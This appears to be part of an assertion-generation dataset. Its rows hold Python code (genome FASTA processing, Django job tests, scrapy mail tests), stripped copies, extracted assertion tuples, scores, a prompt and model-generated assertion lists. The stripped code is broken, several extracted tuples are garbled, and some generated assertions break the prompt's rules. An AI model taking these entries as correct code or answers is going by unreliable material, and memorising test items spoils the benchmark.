11  savedir = os.path.join( os.environ[""HOME""], ""data/human_genome/assembly_36_fasta_process"" )
12  
13if version == 37:
14  fasta_file = ""data/human_genome/assembly_37/gencode.v19.pc_transcripts.fa""
15  savedir = os.path.join( os.environ[""HOME""], ""data/human_genome/assembly_37_fasta_process"" )
16  
17if version == 38:
18  fasta_file = ""data/human_genome/assembly_38/gencode.v25.transcripts.fa""
19  savedir = os.path.join( os.environ[""HOME""], ""data/human_genome/assembly_38_fasta_process"" )
20  
21print ""opening fasta""
22f = open( os.environ[""HOME""] + ""/"" + fasta_file, 'r')
23
24hugo2fptr = {}
25
26#nbr = 95310
27
28#print ""processing nbr %d""%nbr
29s = f.readline()
30i=0
31while len(s)>0:
32  #s = f.readline()
33  if np.mod(i,1000)==0:
34    #print ""S:""
35    print s
36  # 
37  
38  if s[0] == "">"":
39    ss =s.split(""|"")
40    ensembl_transcript = ss[0][1:]
41    ensembl_gene = ss[1]
42    hugo_gene = ss[5]
43    hugo_transcript = ss[4]
44    length = int(ss[6])
45  else:
46    continue
47    
48  seq = f.readline()
49  
50  if hugo2fptr.has_key( hugo_gene ) is False:
51    dirname = os.path.join( savedir, hugo_gene )
52    check_and_mkdir( dirname )
53      
54  hugo2fptr[ hugo_gene ] = open( dirname + ""/sequences.fa"", ""a"" )
55  hugo2fptr[ hugo_gene ].write( s )
56  hugo2fptr[ hugo_gene ].write( seq )
57  hugo2fptr[ hugo_gene ].close()
58  
59  s = f.readline()
60  i+=1
61
62print ""closing file pointers""
63for hugo_gene, fptr in hugo2fptr.iteritems():
64  fptr.close()
65  
66print ""closing fasta""
67f.close()
68print ""done""",3325,"[[7, 'version', '>=', 36, 'version should be 36 or higher for valid fasta files'], 
 [7, 'version', '<=', 38, 'version should be 38 or less for valid fasta files'], 
 [39, 's', '!=', '', 's should not be empty to ensure splitting operation'], 
 [53, 'dirname', '!=', '', 'dirname should not be empty for path join operation'], 
 [54, 'hugo_gene', '!=', '', 'hugo_gene should not be empty for key operation'],
 [37, 'i', '>=', 0, 'i should be non-negative integer because it is used as counter']]"
centrumholdings/cthulhubot,"from django.core.management import call_command
from djangosanetesting import DatabaseTestCase, UnitTestCase

from cthulhubot.jobs import get_job, get_undiscovered_jobs
from cthulhubot.commands import get_command, Sleep as SleepCommand
from cthulhubot.models import Command, Job, JobAssignment
from cthulhubot.err import ConfigurationError, UndiscoveredCommandError, UnconfiguredCommandError
from cthulhubot.forms import get_command_params_from_form_data, get_job_configuration_form

from unit_project.tests.helpers import (
    MockJob, MockBuildComputer, MockProject,
    EchoJob,
    register_mock_jobs_and_commands
)


class TestDiscoverCommand(DatabaseTestCase):
    def test_no_command_available_without_discovery(self):
        self.assert_equals(0, Job.objects.count())

    def test_sleep_discovered(self):
        call_command(""discover"", commit=0)

        slug = 'cthulhubot-sleep'
        try:
            Job.objects.get(slug=slug)
        except Job.DoesNotExist:
            assert False, ""Job not discovered!""

class TestJobsDiscovery(DatabaseTestCase):

    def test_debian_package_creator_discovered(self):
        # aka basic discovering
        job = get_job('cthulhubot-debian-package-creation')
        self.assert_true(job is not None)

    def test_auto_discovery(self):
        self.assert_equals(0, len(Command.objects.all()))
        job = Job.objects.create(slug='cthulhubot-debian-package-creation')
        job.auto_discovery()

        self.assert_equals(4, len(Command.objects.all()))

    def test_command_retrieval(self):
        job = Job.objects.create(slug='cthulhubot-debian-package-creation')
        job.auto_discovery()
        
        commands = job.get_commands()
        self.assert_equals(4, len(commands))

    def test_undiscovered_jobs_retrieval(self):
        assert 'cthulhubot-debian-package-creation' in get_undiscovered_jobs()

    def test_command_not_discovered_as_job(self):
        assert 'cthulhubot-debian-build-debian-package' not in get_undiscovered_jobs()

    def test_get_command_for_configuration(self):
        job = get_undiscovered_jobs().get('cthulhubot-debian-package-creation')()
        params = job.get_configuration_parameters()

        # We shoudl receive one dict per job command
        self.assert_equals(len(job.commands), len(params))

        # and 4 unconfigured commands in ftp
        self.assert_equals(4, len(params[-1:][0]['parameters']))

class TestHelperJobCreation(UnitTestCase):
    def setUp(self):
        super(TestHelperJobCreation, self).setUp()
        self.job = EchoJob()
        register_mock_jobs_and_commands()

    def test_commands_retrieved(self):
        self.assert_equals(1, len(self.job.get_commands()))

class TestJob(UnitTestCase):
    def setUp(self):
        super(TestJob, self).setUp()
        self.job = Job(slug='cthulhubot-sleep').get_domain_object()
        self.echo_job = Job(slug='cthulhubot-test-helper-echo-job').get_domain_object()

    def test_unicode_on_job_returns_proper_text(self):
        self.assert_equals(u""Sleep for a sec"", unicode(self.job))

    def test_unicode_on_model_returns_slug(self):
        self.assert_equals(u""cthulhubot-sleep"", unicode(self.job.model))

    def test_dict_bad_slug_raises_error(self):
        self.assert_raises(ValueError, self.job.get_parameter_dict, 0, 'zoidberg')

    def test_dict_contains_proper_help_text(self):
        self.assert_equals(SleepCommand.parameters['time']['help'], self.job.get_parameter_description_dict(0, 'time')['help'])

    def test_dict_contains_job_value_if_it_overwrites_command(self):
        self.assert_equals(0.02, self.job.get_parameter_dict(0, 'time'))

    def test_empty_form_provided_for_command_one_returned(self):
        self.assert_equals({'commands' : [{'command': 'cthulhubot-sleep', 'parameters': {}}]}, get_command_params_from_form_data(self.job, {}))

    def test_form_created_with_proper_number_of_fields(self):
        self.assert_equals(1, len(get_job_configuration_form(self.job).fields))

    def test_form_default_values_propagated_to_initials(self):
        self.assert_equals(0.02, get_job_configuration_form(self.job).initial.get('job_configuration_0'))

    def test_parameters_from_command_propagated_to_form_even_if_not_specified_there(self):
        self.assert_equals(1, len(get_job_configuration_form(self.echo_job).fields))


class TestJobSubclassing(UnitTestCase):

    def test_directly_overwritten_dict_contains_subclassed_job_value(self):
        job = Job(slug='cthulhubot-test-helper-echo-name-job').get_domain_object()
        self.assert_equals('name', job.get_parameter_dict(0, 'what'))

    def test_global_overwriting_works_on_first_match(self):
        job = Job(slug='cthulhubot-test-helper-multiple-echo-all-defined-job').get_domain_object()
        self.assert_equals('overwritten by job', job.get_parameter_dict(0, 'what'))

    def test_global_overwriting_works_on_all_matches(self):
        job = Job(slug='cthulhubot-test-helper-multiple-echo-all-defined-job').get_domain_object()
        for i in xrange(0, 3):
            self.assert_equals('overwritten by job', job.get_parameter_dict(i, 'what'))

    def test_overwriting_with_callback_works_for_proper_match(self):
        job = Job(slug='cthulhubot-test-helper-multiple-echo-2-defined-job').get_domain_object()
        self.assert_equals('overwritten by job callback', job.get_parameter_dict(1, 'what'))

    def test_overwriting_with_callback_works_do_not_overwrite_unrelated_matches(self):
        job = Job(slug='cthulhubot-test-helper-multiple-echo-2-defined-job').get_domain_object()
        self.assert_equals('first', job.get_parameter_dict(0, 'what'))

class TestCommandConfigUpdate(UnitTestCase):
    def setUp(self):
        super(TestCommandConfigUpdate, self).setUp()
        self.job = Job(slug='cthulhubot-sleep').get_domain_object()

    def test_bad_command_raises_error(self):
        self.assert_raises(ValueError, self.job.update_command_config, 5, {})

    def test_mismatched_command_name(self):
        self.assert_raises(ValueError, self.job.update_command_config, 0, {'command' : 'blahblahblah', 'parameters' : {'time' : 5}})

    def test_config_updated(self):
        self.job.update_command_config(0, {'command' : 'cthulhubot-sleep', 'parameters' : {'time' : 5}})
        self.assert_equals(5, self.job.get_parameter_dict(0, 'time'))

class TestSlotReplacement(UnitTestCase):

    def setUp(self):
        super(TestSlotReplacement, self).setUp()
        self.job = Job(slug='cthulhubot-test-output-job').get_domain_object()

    def test_slot_command_propagated_according_to_config(self):
        config = {
            'command' : 'cthulhubot-test-helper-echo',
            'parameters' : {}
        }
        self.job.update_command_config(0, config)

        self.assert_equals(config['command'], self.job.get_configuration_parameters()[0]['command'])

    def test_update_with_command_from_other_slot_prohibited(self):
        self.assert_raises(ValueError, self.job.update_command_config, 0, {'command' : 'cthulhubot-sleep', 'parameters' : {}})

    def test_attempt_to_work_with_unconfigured_slot_raises_error(self):
        self.assert_raises(UnconfiguredCommandError, self.job.get_commands)

","
1from django.core.management import call_command
2from djangosanetesting import DatabaseTestCase, UnitTestCase
3
4from cthulhubot.jobs import get_job, get_undiscovered_jobs
5from cthulhubot.commands import get_command, Sleep as SleepCommand
6from cthulhubot.models import Command, Job, JobAssignment
7from cthulhubot.err import ConfigurationError, UndiscoveredCommandError, UnconfiguredCommandError
8from cthulhubot.forms import get_command_params_from_form_data, get_job_configuration_form
9
10from unit_project.tests.helpers import (
11    MockJob, MockBuildComputer, MockProject,
12    EchoJob,
13    register_mock_jobs_and_commands
14)
15
16
17class TestDiscoverCommand(DatabaseTestCase):
18    def test_no_command_available_without_discovery(self):
19
20    def test_sleep_discovered(self):
21        call_command(""discover"", commit=0)
22
23        slug = 'cthulhubot-sleep'
24        try:
25            Job.objects.get(slug=slug)
26        except Job.DoesNotExist:
27
28class TestJobsDiscovery(DatabaseTestCase):
29
30    def test_debian_package_creator_discovered(self):
31        # aka basic discovering
32        job = get_job('cthulhubot-debian-package-creation')
33
34    def test_auto_discovery(self):
35        job = Job.objects.create(slug='cthulhubot-debian-package-creation')
36        job.auto_discovery()
37
38
39    def test_command_retrieval(self):
40        job = Job.objects.create(slug='cthulhubot-debian-package-creation')
41        job.auto_discovery()
42        
43        commands = job.get_commands()
44
45    def test_undiscovered_jobs_retrieval(self):
46
47    def test_command_not_discovered_as_job(self):
48
49    def test_get_command_for_configuration(self):
50        job = get_undiscovered_jobs().get('cthulhubot-debian-package-creation')()
51        params = job.get_configuration_parameters()
52
53        # We shoudl receive one dict per job command
54
55        # and 4 unconfigured commands in ftp
56
57class TestHelperJobCreation(UnitTestCase):
58    def setUp(self):
59        super(TestHelperJobCreation, self).setUp()
60        self.job = EchoJob()
61        register_mock_jobs_and_commands()
62
63    def test_commands_retrieved(self):
64
65class TestJob(UnitTestCase):
66    def setUp(self):
67        super(TestJob, self).setUp()
68        self.job = Job(slug='cthulhubot-sleep').get_domain_object()
69        self.echo_job = Job(slug='cthulhubot-test-helper-echo-job').get_domain_object()
70
71    def test_unicode_on_job_returns_proper_text(self):
72
73    def test_unicode_on_model_returns_slug(self):
74
75    def test_dict_bad_slug_raises_error(self):
76
77    def test_dict_contains_proper_help_text(self):
78
79    def test_dict_contains_job_value_if_it_overwrites_command(self):
80
81    def test_empty_form_provided_for_command_one_returned(self):
82
83    def test_form_created_with_proper_number_of_fields(self):
84
85    def test_form_default_values_propagated_to_initials(self):
86
87    def test_parameters_from_command_propagated_to_form_even_if_not_specified_there(self):
88
89
90class TestJobSubclassing(UnitTestCase):
91
92    def test_directly_overwritten_dict_contains_subclassed_job_value(self):
93        job = Job(slug='cthulhubot-test-helper-echo-name-job').get_domain_object()
94
95    def test_global_overwriting_works_on_first_match(self):
96        job = Job(slug='cthulhubot-test-helper-multiple-echo-all-defined-job').get_domain_object()
97
98    def test_global_overwriting_works_on_all_matches(self):
99        job = Job(slug='cthulhubot-test-helper-multiple-echo-all-defined-job').get_domain_object()
100        for i in xrange(0, 3):
101
102    def test_overwriting_with_callback_works_for_proper_match(self):
103        job = Job(slug='cthulhubot-test-helper-multiple-echo-2-defined-job').get_domain_object()
104
105    def test_overwriting_with_callback_works_do_not_overwrite_unrelated_matches(self):
106        job = Job(slug='cthulhubot-test-helper-multiple-echo-2-defined-job').get_domain_object()
107
108class TestCommandConfigUpdate(UnitTestCase):
109    def setUp(self):
110        super(TestCommandConfigUpdate, self).setUp()
111        self.job = Job(slug='cthulhubot-sleep').get_domain_object()
112
113    def test_bad_command_raises_error(self):
114
115    def test_mismatched_command_name(self):
116
117    def test_config_updated(self):
118        self.job.update_command_config(0, {'command' : 'cthulhubot-sleep', 'parameters' : {'time' : 5}})
119
120class TestSlotReplacement(UnitTestCase):
121
122    def setUp(self):
123        super(TestSlotReplacement, self).setUp()
124        self.job = Job(slug='cthulhubot-test-output-job').get_domain_object()
125
126    def test_slot_command_propagated_according_to_config(self):
127        config = {
128            'command' : 'cthulhubot-test-helper-echo',
129            'parameters' : {}
130        }
131        self.job.update_command_config(0, config)
132
133
134    def test_update_with_command_from_other_slot_prohibited(self):
135
136    def test_attempt_to_work_with_unconfigured_slot_raises_error(self):
137
138","[['False', '==', 'True'], ['.objects.all()))', '==', 'True'], ['.objects.all()))', '==', 'True'], ['s))', '==', 'True'], ['s)', '==', 'True'], ['s()))', '==', 'True'], ["".parameters['time']['help']"", '==', 'True'], [""s'"", ':', ""[{'comm""], [""':"", ""'cthulhubot-sleep'""], ['_params_from_form_data(self.job', '==', 'True'], ['_config', '==', 'True'], ['_config', '==', 'True'], [""'"", ':', ""'blahblahblah'""], [""']"", '==', 'True'], [""'])"", '==', 'True'], ['_config', '==', 'True'], [""'"", ':', ""'cthulhubot-sleep'""], ['Error', '==', 'True'], ['s)', '==', 'True']]",31,19,0.6129032258064516,0.0026246719160104,"['slug', 'job', 'commands', 'params', 'self.job', 'self.echo_job', 'config']",7,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['slug', 'job', 'commands', 'params', 'self.job', 'self.echo_job', 'config']
*Code:

1from django.core.management import call_command
2from djangosanetesting import DatabaseTestCase, UnitTestCase
3
4from cthulhubot.jobs import get_job, get_undiscovered_jobs
5from cthulhubot.commands import get_command, Sleep as SleepCommand
6from cthulhubot.models import Command, Job, JobAssignment
7from cthulhubot.err import ConfigurationError, UndiscoveredCommandError, UnconfiguredCommandError
8from cthulhubot.forms import get_command_params_from_form_data, get_job_configuration_form
9
10from unit_project.tests.helpers import (
11    MockJob, MockBuildComputer, MockProject,
12    EchoJob,
13    register_mock_jobs_and_commands
14)
15
16
17class TestDiscoverCommand(DatabaseTestCase):
18    def test_no_command_available_without_discovery(self):
19
20    def test_sleep_discovered(self):
21        call_command(""discover"", commit=0)
22
23        slug = 'cthulhubot-sleep'
24        try:
25            Job.objects.get(slug=slug)
26        except Job.DoesNotExist:
27
28class TestJobsDiscovery(DatabaseTestCase):
29
30    def test_debian_package_creator_discovered(self):
31        # aka basic discovering
32        job = get_job('cthulhubot-debian-package-creation')
33
34    def test_auto_discovery(self):
35        job = Job.objects.create(slug='cthulhubot-debian-package-creation')
36        job.auto_discovery()
37
38
39    def test_command_retrieval(self):
40        job = Job.objects.create(slug='cthulhubot-debian-package-creation')
41        job.auto_discovery()
42        
43        commands = job.get_commands()
44
45    def test_undiscovered_jobs_retrieval(self):
46
47    def test_command_not_discovered_as_job(self):
48
49    def test_get_command_for_configuration(self):
50        job = get_undiscovered_jobs().get('cthulhubot-debian-package-creation')()
51        params = job.get_configuration_parameters()
52
53        # We shoudl receive one dict per job command
54
55        # and 4 unconfigured commands in ftp
56
57class TestHelperJobCreation(UnitTestCase):
58    def setUp(self):
59        super(TestHelperJobCreation, self).setUp()
60        self.job = EchoJob()
61        register_mock_jobs_and_commands()
62
63    def test_commands_retrieved(self):
64
65class TestJob(UnitTestCase):
66    def setUp(self):
67        super(TestJob, self).setUp()
68        self.job = Job(slug='cthulhubot-sleep').get_domain_object()
69        self.echo_job = Job(slug='cthulhubot-test-helper-echo-job').get_domain_object()
70
71    def test_unicode_on_job_returns_proper_text(self):
72
73    def test_unicode_on_model_returns_slug(self):
74
75    def test_dict_bad_slug_raises_error(self):
76
77    def test_dict_contains_proper_help_text(self):
78
79    def test_dict_contains_job_value_if_it_overwrites_command(self):
80
81    def test_empty_form_provided_for_command_one_returned(self):
82
83    def test_form_created_with_proper_number_of_fields(self):
84
85    def test_form_default_values_propagated_to_initials(self):
86
87    def test_parameters_from_command_propagated_to_form_even_if_not_specified_there(self):
88
89
90class TestJobSubclassing(UnitTestCase):
91
92    def test_directly_overwritten_dict_contains_subclassed_job_value(self):
93        job = Job(slug='cthulhubot-test-helper-echo-name-job').get_domain_object()
94
95    def test_global_overwriting_works_on_first_match(self):
96        job = Job(slug='cthulhubot-test-helper-multiple-echo-all-defined-job').get_domain_object()
97
98    def test_global_overwriting_works_on_all_matches(self):
99        job = Job(slug='cthulhubot-test-helper-multiple-echo-all-defined-job').get_domain_object()
100        for i in xrange(0, 3):
101
102    def test_overwriting_with_callback_works_for_proper_match(self):
103        job = Job(slug='cthulhubot-test-helper-multiple-echo-2-defined-job').get_domain_object()
104
105    def test_overwriting_with_callback_works_do_not_overwrite_unrelated_matches(self):
106        job = Job(slug='cthulhubot-test-helper-multiple-echo-2-defined-job').get_domain_object()
107
108class TestCommandConfigUpdate(UnitTestCase):
109    def setUp(self):
110        super(TestCommandConfigUpdate, self).setUp()
111        self.job = Job(slug='cthulhubot-sleep').get_domain_object()
112
113    def test_bad_command_raises_error(self):
114
115    def test_mismatched_command_name(self):
116
117    def test_config_updated(self):
118        self.job.update_command_config(0, {'command' : 'cthulhubot-sleep', 'parameters' : {'time' : 5}})
119
120class TestSlotReplacement(UnitTestCase):
121
122    def setUp(self):
123        super(TestSlotReplacement, self).setUp()
124        self.job = Job(slug='cthulhubot-test-output-job').get_domain_object()
125
126    def test_slot_command_propagated_according_to_config(self):
127        config = {
128            'command' : 'cthulhubot-test-helper-echo',
129            'parameters' : {}
130        }
131        self.job.update_command_config(0, config)
132
133
134    def test_update_with_command_from_other_slot_prohibited(self):
135
136    def test_attempt_to_work_with_unconfigured_slot_raises_error(self):
137
138",6521,"[[23, 'slug', '!=', '', 'slug should not be an empty string'],
 [33, 'job', '!=', None, 'job should not be None after calling get_job'],
 [35, 'job', '!=', None, 'job should not be None after creating a new Job'],
 [50, 'job', '!=', None, 'job should not be None after getting undiscovered jobs'],
 [51, 'params', '!=', None, 'params should not be None after getting configuration parameters'],
 [60, 'self.job', '!=', None, 'self.job should not be None after initializing EchoJob'],
 [68, 'self.job', '!=', None, 'self.job should not be None after getting domain object from Job'],
 [69, 'self.echo_job', '!=', None, 'self.echo_job should not be None after getting domain object from Job'],
 [93, 'job', '!=', None, 'job should not be None after getting domain object from Job'],
 [96, 'job', '!=', None, 'job should not be None after getting domain object from Job'],
 [99, 'job', '!=', None, 'job should not be None after getting domain object from Job'],
 [103, 'job', '!=', None, 'job should not be None after getting domain object from Job'],
 [106, 'job', '!=', None, 'job should not be None after getting domain object from Job'],
 [111, 'self.job', '!=', None, 'self.job should not be None after getting domain object from Job'],
 [124, 'self.job', '!=', None, 'self.job should not be None after getting domain object from Job'],
 [128, 'config', '!=', None, 'config should not be an empty dictionary after assignment']]"
shaform/scrapy,"# coding=utf-8

import unittest
from io import BytesIO
from email.charset import Charset

from scrapy.mail import MailSender

class MailSenderTest(unittest.TestCase):

    def test_send(self):
        mailsender = MailSender(debug=True)
        mailsender.send(to=['test@scrapy.org'], subject='subject', body='body',
                        _callback=self._catch_mail_sent)

        assert self.catched_msg

        self.assertEqual(self.catched_msg['to'], ['test@scrapy.org'])
        self.assertEqual(self.catched_msg['subject'], 'subject')
        self.assertEqual(self.catched_msg['body'], 'body')

        msg = self.catched_msg['msg']
        self.assertEqual(msg['to'], 'test@scrapy.org')
        self.assertEqual(msg['subject'], 'subject')
        self.assertEqual(msg.get_payload(), 'body')
        self.assertEqual(msg.get('Content-Type'), 'text/plain')

    def test_send_single_values_to_and_cc(self):
        mailsender = MailSender(debug=True)
        mailsender.send(to='test@scrapy.org', subject='subject', body='body',
                        cc='test@scrapy.org', _callback=self._catch_mail_sent)

    def test_send_html(self):
        mailsender = MailSender(debug=True)
        mailsender.send(to=['test@scrapy.org'], subject='subject',
                        body='<p>body</p>', mimetype='text/html',
                        _callback=self._catch_mail_sent)

        msg = self.catched_msg['msg']
        self.assertEqual(msg.get_payload(), '<p>body</p>')
        self.assertEqual(msg.get('Content-Type'), 'text/html')

    def test_send_attach(self):
        attach = BytesIO()
        attach.write(b'content')
        attach.seek(0)
        attachs = [('attachment', 'text/plain', attach)]

        mailsender = MailSender(debug=True)
        mailsender.send(to=['test@scrapy.org'], subject='subject', body='body',
                       attachs=attachs, _callback=self._catch_mail_sent)

        assert self.catched_msg
        self.assertEqual(self.catched_msg['to'], ['test@scrapy.org'])
        self.assertEqual(self.catched_msg['subject'], 'subject')
        self.assertEqual(self.catched_msg['body'], 'body')

        msg = self.catched_msg['msg']
        self.assertEqual(msg['to'], 'test@scrapy.org')
        self.assertEqual(msg['subject'], 'subject')

        payload = msg.get_payload()
        assert isinstance(payload, list)
        self.assertEqual(len(payload), 2)

        text, attach = payload
        self.assertEqual(text.get_payload(decode=True), b'body')
        self.assertEqual(text.get_charset(), Charset('us-ascii'))
        self.assertEqual(attach.get_payload(decode=True), b'content')

    def _catch_mail_sent(self, **kwargs):
        self.catched_msg = dict(**kwargs)

    def test_send_utf8(self):
        subject = u'sübjèçt'
        body = u'bödÿ-àéïöñß'
        mailsender = MailSender(debug=True)
        mailsender.send(to=['test@scrapy.org'], subject=subject, body=body,
                        charset='utf-8', _callback=self._catch_mail_sent)

        assert self.catched_msg
        self.assertEqual(self.catched_msg['subject'], subject)
        self.assertEqual(self.catched_msg['body'], body)

        msg = self.catched_msg['msg']
        self.assertEqual(msg['subject'], subject)
        self.assertEqual(msg.get_payload(), body)
        self.assertEqual(msg.get_charset(), Charset('utf-8'))
        self.assertEqual(msg.get('Content-Type'), 'text/plain; charset=""utf-8""')

    def test_send_attach_utf8(self):
        subject = u'sübjèçt'
        body = u'bödÿ-àéïöñß'
        attach = BytesIO()
        attach.write(body.encode('utf-8'))
        attach.seek(0)
        attachs = [('attachment', 'text/plain', attach)]

        mailsender = MailSender(debug=True)
        mailsender.send(to=['test@scrapy.org'], subject=subject, body=body,
                        attachs=attachs, charset='utf-8',
                        _callback=self._catch_mail_sent)

        assert self.catched_msg
        self.assertEqual(self.catched_msg['subject'], subject)
        self.assertEqual(self.catched_msg['body'], body)

        msg = self.catched_msg['msg']
        self.assertEqual(msg['subject'], subject)
        self.assertEqual(msg.get_charset(), Charset('utf-8'))
        self.assertEqual(msg.get('Content-Type'),
                         'multipart/mixed; charset=""utf-8""')

        payload = msg.get_payload()
        assert isinstance(payload, list)
        self.assertEqual(len(payload), 2)

        text, attach = payload
        self.assertEqual(text.get_payload(decode=True).decode('utf-8'), body)
        self.assertEqual(text.get_charset(), Charset('utf-8'))
        self.assertEqual(attach.get_payload(decode=True).decode('utf-8'), body)

if __name__ == ""__main__"":
    unittest.main()
","
1# coding=utf-8
2
3import unittest
4from io import BytesIO
5from email.charset import Charset
6
7from scrapy.mail import MailSender
8
9class MailSenderTest(unittest.TestCase):
10
11    def test_send(self):
12        mailsender = MailSender(debug=True)
13        mailsender.send(to=['test@scrapy.org'], subject='subject', body='body',
14                        _callback=self._catch_mail_sent)
15
16
17
18        msg = self.catched_msg['msg']
19
20    def test_send_single_values_to_and_cc(self):
21        mailsender = MailSender(debug=True)
22        mailsender.send(to='test@scrapy.org', subject='subject', body='body',
23                        cc='test@scrapy.org', _callback=self._catch_mail_sent)
24
25    def test_send_html(self):
26        mailsender = MailSender(debug=True)
27        mailsender.send(to=['test@scrapy.org'], subject='subject',
28                        body='<p>body</p>', mimetype='text/html',
29                        _callback=self._catch_mail_sent)
30
31        msg = self.catched_msg['msg']
32
33    def test_send_attach(self):
34        attach = BytesIO()
35        attach.write(b'content')
36        attach.seek(0)
37        attachs = [('attachment', 'text/plain', attach)]
38
39        mailsender = MailSender(debug=True)
40        mailsender.send(to=['test@scrapy.org'], subject='subject', body='body',
41                       attachs=attachs, _callback=self._catch_mail_sent)
42
43
44        msg = self.catched_msg['msg']
45
46        payload = msg.get_payload()
47
48        text, attach = payload
49
50    def _catch_mail_sent(self, **kwargs):
51        self.catched_msg = dict(**kwargs)
52
53    def test_send_utf8(self):
54        subject = u'sübjèçt'
55        body = u'bödÿ-àéïöñß'
56        mailsender = MailSender(debug=True)
57        mailsender.send(to=['test@scrapy.org'], subject=subject, body=body,
58                        charset='utf-8', _callback=self._catch_mail_sent)
59
60
61        msg = self.catched_msg['msg']
62
63    def test_send_attach_utf8(self):
64        subject = u'sübjèçt'
65        body = u'bödÿ-àéïöñß'
66        attach = BytesIO()
67        attach.write(body.encode('utf-8'))
68        attach.seek(0)
69        attachs = [('attachment', 'text/plain', attach)]
70
71        mailsender = MailSender(debug=True)
72        mailsender.send(to=['test@scrapy.org'], subject=subject, body=body,
73                        attachs=attachs, charset='utf-8',
74                        _callback=self._catch_mail_sent)
75
76
77        msg = self.catched_msg['msg']
78                         'multipart/mixed; charset=""utf-8""')
79
80        payload = msg.get_payload()
81
82        text, attach = payload
83
84if __name__ == ""__main__"":
85    unittest.main()
86","[['self.catched_msg', '==', 'True'], ['self.catched_msg', '==', 'True'], ['self.catched_msg', '==', 'True'], ['self.catched_msg', '==', 'True']]",39,4,0.1025641025641025,0.0008401596303297,"['mailsender', 'msg', 'attach', 'attachs', 'payload', 'text', '**kwargs', 'self.catched_msg', 'subject', 'body']",10,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['mailsender', 'msg', 'attach', 'attachs', 'payload', 'text', '**kwargs', 'self.catched_msg', 'subject', 'body']
*Code:

1# coding=utf-8
2
3import unittest
4from io import BytesIO
5from email.charset import Charset
6
7from scrapy.mail import MailSender
8
9class MailSenderTest(unittest.TestCase):
10
11    def test_send(self):
12        mailsender = MailSender(debug=True)
13        mailsender.send(to=['test@scrapy.org'], subject='subject', body='body',
14                        _callback=self._catch_mail_sent)
15
16
17
18        msg = self.catched_msg['msg']
19
20    def test_send_single_values_to_and_cc(self):
21        mailsender = MailSender(debug=True)
22        mailsender.send(to='test@scrapy.org', subject='subject', body='body',
23                        cc='test@scrapy.org', _callback=self._catch_mail_sent)
24
25    def test_send_html(self):
26        mailsender = MailSender(debug=True)
27        mailsender.send(to=['test@scrapy.org'], subject='subject',
28                        body='<p>body</p>', mimetype='text/html',
29                        _callback=self._catch_mail_sent)
30
31        msg = self.catched_msg['msg']
32
33    def test_send_attach(self):
34        attach = BytesIO()
35        attach.write(b'content')
36        attach.seek(0)
37        attachs = [('attachment', 'text/plain', attach)]
38
39        mailsender = MailSender(debug=True)
40        mailsender.send(to=['test@scrapy.org'], subject='subject', body='body',
41                       attachs=attachs, _callback=self._catch_mail_sent)
42
43
44        msg = self.catched_msg['msg']
45
46        payload = msg.get_payload()
47
48        text, attach = payload
49
50    def _catch_mail_sent(self, **kwargs):
51        self.catched_msg = dict(**kwargs)
52
53    def test_send_utf8(self):
54        subject = u'sübjèçt'
55        body = u'bödÿ-àéïöñß'
56        mailsender = MailSender(debug=True)
57        mailsender.send(to=['test@scrapy.org'], subject=subject, body=body,
58                        charset='utf-8', _callback=self._catch_mail_sent)
59
60
61        msg = self.catched_msg['msg']
62
63    def test_send_attach_utf8(self):
64        subject = u'sübjèçt'
65        body = u'bödÿ-àéïöñß'
66        attach = BytesIO()
67        attach.write(body.encode('utf-8'))
68        attach.seek(0)
69        attachs = [('attachment', 'text/plain', attach)]
70
71        mailsender = MailSender(debug=True)
72        mailsender.send(to=['test@scrapy.org'], subject=subject, body=body,
73                        attachs=attachs, charset='utf-8',
74                        _callback=self._catch_mail_sent)
75
76
77        msg = self.catched_msg['msg']
78                         'multipart/mixed; charset=""utf-8""')
79
80        payload = msg.get_payload()
81
82        text, attach = payload
83
84if __name__ == ""__main__"":
85    unittest.main()
86",4216,"[[13, 'mailsender', '!=', None, 'Ensure mailsender is initialized'],
 [21, 'mailsender', '!=', None, 'Ensure mailsender is initialized'],
 [27, 'mailsender', '!=', None, 'Ensure mailsender is initialized'],
 [39, 'mailsender', '!=', None, 'Ensure mailsender is initialized'],
 [57, 'mailsender', '!=', None, 'Ensure mailsender is initialized'],
 [71, 'mailsender', '!=', None, 'Ensure mailsender is initialized'],
 [18, 'msg', '!=', None, 'Ensure msg is assigned'],
 [31, 'msg', '!=', None, 'Ensure msg is assigned'],
 [44, 'msg', '!=', None, 'Ensure msg is assigned'],
 [61, 'msg', '!=', None, 'Ensure msg is assigned'],
 [77, 'msg', '!=', None, 'Ensure msg is assigned'],
 [46, 'payload', '!=', None, 'Ensure payload is found'],
 [80, 'payload', '!=', None, 'Ensure payload is found'],
